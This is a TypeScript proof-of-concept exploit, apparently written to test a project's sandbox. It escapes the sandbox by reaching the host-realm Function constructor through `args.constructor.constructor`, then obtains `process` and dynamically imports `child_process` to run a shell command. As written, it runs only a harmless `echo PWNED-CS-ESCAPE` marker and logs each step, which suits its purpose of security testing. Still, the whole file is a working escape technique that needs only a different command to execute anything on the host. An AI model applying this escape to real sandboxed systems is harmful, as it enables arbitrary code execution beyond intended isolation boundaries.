// goal-poc2b: cross-realm Function leak via `args` → mainModule.require('child_process').
//
// The lowering rewrites the facade constant `args` to `__host.args` (src/dwf/lower.ts
// isArgsReference), and `__host.args` is `JSON.parse(argsJson)` — an object created in
// the child HOST realm (src/dwf/child-main.ts:107). Its `.constructor.constructor` is
// therefore the HOST Function constructor, on which the VM-context-only
// `codeGeneration: { strings: false }` (child-main.ts:288-292) has no effect.
//
// This variant is statically clean by construction: `args` is a declared facade
// primitive, no banned identifier appears, and calling a Function-typed value
// typechecks (verified: tsc 5.9.3 --strict --lib es2022, exit 0).
//
// Steps, each logged so the parent journal records the outcome:
//  1. host Function via args.constructor.constructor → `return process`;
//  2. process.mainModule.require('child_process') (canonical CJS route; child-main.js
//     is ESM — package.json "type":"module" — so mainModule is expected undefined);
//  3. dynamic import('child_process') inside a host-compiled function (the realistic
//     ESM module route);
//  4. if a child_process module is actually obtained, execSync a benign marker.
const F: any = (args as any).constructor.constructor;

let hostProc = "unavailable";
try {
  const proc: any = F("return process")();
  hostProc = typeof proc;
} catch (e) {
  hostProc = "blocked:" + (e as Error).name;
}
log("POC2B-HOST-PROCESS:" + hostProc);

let mainModuleReport = "no-attempt";
if (hostProc === "object") {
  try {
    const proc: any = F("return process")();
    const mm: any = proc.mainModule;
    mainModuleReport = mm ? "mainModule-ok:" + typeof mm.require : "mainModule-undefined";
  } catch (e) {
    mainModuleReport = "mainModule-err:" + (e as Error).message;
  }
}
log("POC2B-MAIN-MODULE:" + mainModuleReport);

let execReport = "no-exec";
if (hostProc === "object") {
  try {
    const mod: any = await F("return import('child_process')")();
    const out: string = mod.default.execSync("echo PWNED-CS-ESCAPE").toString().trim();
    execReport = "EXEC:" + out;
  } catch (e) {
    execReport = "exec-err:" + (e as Error).name + ":" + String((e as Error).message ?? "").slice(0, 160);
  }
}
log("POC2B-EXEC:" + execReport);

return { hostProcess: hostProc, mainModule: mainModuleReport, exec: execReport };
